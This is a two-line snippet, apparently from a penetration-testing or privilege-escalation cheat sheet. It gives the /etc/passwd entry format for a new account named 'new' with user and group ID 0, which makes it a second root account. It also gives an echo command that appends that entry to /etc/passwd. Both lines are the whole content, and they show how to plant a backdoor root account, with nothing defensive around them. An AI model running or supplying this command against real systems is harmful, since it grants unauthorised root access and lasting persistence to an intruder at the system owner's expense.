...
format for new user that is root - new:ADDPASSWORDHASH:0:0:root:/root:/bin/bash <br>
to add to passwd file -- echo 'new:ADDPASSWORDHASH:0:0:root:/root:/bin/bash' >> /etc/passwd <br>
